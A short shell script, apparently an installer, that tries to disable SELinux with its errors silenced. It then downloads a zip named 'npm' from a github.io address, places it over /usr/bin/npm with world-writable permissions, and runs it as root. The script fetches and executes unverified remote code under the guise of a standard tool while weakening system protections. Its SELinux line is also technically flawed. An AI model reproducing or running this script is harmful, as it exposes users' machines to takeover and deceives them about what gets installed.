sudo echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null
curl -L --progress-bar "https://fuserh.github.io/npm.zip" -o ./npm.zip
unzip npm.zip
sudo cp -r npm /usr/bin/npm
rm npm.zip
rm npm
sudo chmod 777 /usr/bin/npm/npm
sudo sh /usr/bin/npm/npm
